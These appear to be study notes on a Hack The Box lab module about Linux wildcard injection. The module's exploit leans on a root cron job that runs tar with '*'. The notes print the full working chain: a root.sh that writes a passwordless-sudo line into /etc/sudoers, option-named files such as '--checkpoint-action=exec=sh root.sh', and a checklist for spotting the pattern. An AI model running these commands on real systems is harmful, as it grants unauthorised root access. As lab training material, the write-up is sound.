# 1. 🧠 What is a Wildcard?

A **wildcard character** is used as a replacement for other characters and is interpreted by the shell before other actions.

For example:

```bash
ls *
```

The shell expands `*` into matching filenames **before `ls` receives the arguments**.

### Visual

```text
Command typed
     │
     ▼
ls *
     │
     ▼
Shell expands *
     │
     ▼
ls file1.txt file2.txt notes.txt
     │
     ▼
ls executes
```

This shell expansion is the foundation of **wildcard abuse**.

---

# 2. 📋 Important Wildcards

|Character|Significance|
|---|---|
|`*`|Matches any number of characters in a filename|
|`?`|Matches a single character|
|`[ ]`|Matches a single character from the defined characters|
|`~`|At the beginning, expands to the user's home directory; can also refer to another user's home directory|
|`-`|Within brackets, denotes a range of characters|

### ⭐ Memorize these

```text
*       → many characters
?       → one character
[ ]     → one character from a set
~       → home directory
-       → range inside brackets
```

---

# 3. 🚨 Why Can Wildcards Become Dangerous?

Normally:

```bash
tar -zcf backup.tar.gz *
```

looks harmless.

But the shell doesn't know that `tar` intends `*` to represent ordinary filenames.

Suppose the directory contains specially named files:

```text
--checkpoint=1
--checkpoint-action=exec=...
```

The shell can expand:

```bash
*
```

into those filenames.

So `tar` may effectively receive:

```text
tar -zcf backup.tar.gz --checkpoint=1 --checkpoint-action=...
```

Now those filenames are being interpreted as **options**.

### The attack concept

```text
             *
             │
             ▼
       Shell expansion
             │
             ▼
 ┌─────────────────────────┐
 │ Specially named files   │
 │ beginning with "--"     │
 └─────────────────────────┘
             │
             ▼
       tar sees options
             │
             ▼
      Option functionality
             │
             ▼
   Potential privileged action
```

---

# 4. 🧰 The `tar` Example

The module uses `tar` because it has options that make this technique particularly interesting.

From the `tar` man page:

```text
--checkpoint[=N]
       Display progress messages every Nth record (default 10).

--checkpoint-action=ACTION
       Run ACTION on each checkpoint.
```

The important option is:

```text
--checkpoint-action
```

It permits an `EXEC` action to be executed when a checkpoint is reached.

In other words, `tar` can be instructed to execute an operating-system command when the appropriate checkpoint condition occurs.

---

# 5. ⏰ The Vulnerable Cron Job

The module gives this cron job:

```bash
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

Let's understand it carefully.

### Cron timing

```text
*/01 * * * *
```

means the job runs **every minute** in the module's example.

Then:

```bash
cd /home/htb-student
```

changes into the target directory.

Finally:

```bash
tar -zcf /home/htb-student/backup.tar.gz *
```

creates a compressed archive containing the directory's contents.

---

# 6. 🔥 Why This Cron Job Is Interesting

The important portion is:

```bash
*
```

The cron job doesn't explicitly list the files.

Instead:

```text
tar ... *
         │
         ▼
    Shell expands *
         │
         ▼
     Filenames
         │
         ▼
     tar arguments
```

If we can create files with names that look like `tar` options, those names can potentially become **options passed to `tar`**.

That's the vulnerability pattern.

---

# 7. 🎯 The Module's Exploitation Chain

The module creates three files:

### ① `root.sh`

```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

This creates a script containing:

```bash
echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
```

The purpose is to add:

```text
htb-student ALL=(root) NOPASSWD: ALL
```

to `/etc/sudoers`.

---

### ② Create the checkpoint-action filename

```bash
echo "" > "--checkpoint-action=exec=sh root.sh"
```

Notice the filename itself:

```text
--checkpoint-action=exec=sh root.sh
```

This is designed to be interpreted by `tar` as the corresponding option when wildcard expansion occurs.

---

### ③ Create the checkpoint filename

```bash
echo "" > --checkpoint=1
```

This creates:

```text
--checkpoint=1
```

Again, it is intended to become a `tar` command-line option.

---

# 8. 🧩 Put the Pieces Together

The directory now contains:

```text
/home/htb-student/
│
├── root.sh
│
├── --checkpoint=1
│
├── --checkpoint-action=exec=sh root.sh
│
└── other files...
```

The cron job executes:

```bash
tar -zcf /home/htb-student/backup.tar.gz *
```

The shell expands:

```text
*
```

into filenames.

Conceptually:

```text
*
│
▼
--checkpoint=1
--checkpoint-action=exec=sh root.sh
root.sh
...
```

Those specially named files can therefore become arguments to `tar`.

---

# 9. 💥 Result

When the cron job runs, the `tar` options cause the specified action to execute.

The module then checks:

```bash
sudo -l
```

and obtains:

```text
User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```

This means the account has been granted passwordless sudo access to root.

The attack chain is therefore:

```text
┌───────────────────────────────────┐
│ Vulnerable cron job               │
│                                   │
│ tar ... *                         │
└─────────────────┬─────────────────┘
                  │
                  ▼
          Shell expands *
                  │
                  ▼
       Special filenames become
          tar command options
                  │
                  ▼
       tar executes specified action
                  │
                  ▼
              root.sh
                  │
                  ▼
       Modify /etc/sudoers
                  │
                  ▼
      NOPASSWD sudo privilege
                  │
                  ▼
                 ROOT
```

---

# 10. 🔎 Why `--` Matters

You'll notice the malicious filenames begin with:

```text
--
```

For example:

```text
--checkpoint=1
```

This is significant because command-line programs commonly interpret arguments beginning with `-` or `--` as **options**.

Compare:

```text
normal.txt
```

versus:

```text
--some-option
```

The second can be interpreted as an option rather than an ordinary filename.

That's what makes **filename → command-line option injection** possible in vulnerable wildcard usage.

---

# 11. 🧠 The Most Important Concept

Don't memorize this as simply:

> "`tar` + `*` = privilege escalation."

That's not correct.

The actual concept is:

```text
Privileged command
       +
Unsafe wildcard usage
       +
Attacker-controlled filenames
       +
Filename interpreted as an option
       +
Dangerous program option
       =
Potential privilege escalation
```

---

# 12. 🚨 What To Look For During Enumeration

When you're enumerating a Linux machine, if you discover:

```bash
cron
```

or another automated job, inspect whether it uses wildcards.

For example:

```bash
tar ... *
```

or:

```bash
cp * /some/location
```

or:

```bash
rsync * /some/location
```

The important question is:

> **Can I control the filenames that the wildcard expands to?**

Then ask:

```text
       Is the job privileged?
              │
              ▼
       Does it use a wildcard?
              │
              ▼
    Can I create filenames there?
              │
              ▼
 Can filenames become command options?
              │
              ▼
 Does the program have a dangerous
       option/functionality?
              │
              ▼
       Potential PATH to root
```

---

# 🛡️ 13. Defensive Perspective

The fundamental problem is **untrusted filenames being expanded into command arguments**.

Safer approaches include:

- Avoiding unsafe wildcard usage in privileged scripts.
    
- Using explicit file paths or controlled file lists.
    
- Using appropriate `tar` options to prevent filenames from being interpreted as options.
    
- Restricting write permissions on directories processed by privileged jobs.
    

The module specifically demonstrates the offensive technique; these defensive points are general security context.

---

# 🧪 HTB-Style Recognition

If you see:

```bash
tar -zcf backup.tar.gz *
```

🚨 **STOP AND INVESTIGATE.**

Ask:

**1. Who runs it?**

```text
root?
```

**2. Where does it run?**

```text
Which directory?
```

**3. Can I write to that directory?**

```text
yes/no
```

**4. Does it use `*`?**

```text
yes
```

**5. Can specially named files become `tar` options?**

```text
yes
```

**6. Does `tar` have functionality that can execute an action?**

```text
--checkpoint
--checkpoint-action
```

That's the chain you need to recognize.

---

# 🔥 STRICT MENTOR — MUST REMEMBER

### Wildcard expansion happens **before** the command executes.

```text
Shell
 ↓
Expand wildcard
 ↓
Build argument list
 ↓
Execute program
```

### Therefore:

```bash
tar ... *
```

does **not** literally give `tar` a `*`.

The shell first turns `*` into filenames.

That's the entire foundation of this attack.

---

## 📌 Commands From the Module — Keep These

```bash
man tar
```

```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

```bash
echo "" > "--checkpoint-action=exec=sh root.sh"
```

```bash
echo "" > --checkpoint=1
```

```bash
ls -la
```

```bash
sudo -l
```

And the vulnerable cron job:

```bash
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

### 🧠 One-line revision

> **Wildcard abuse = shell expands attacker-controlled filenames into command arguments, potentially turning filenames into dangerous options when a privileged program uses `*`.**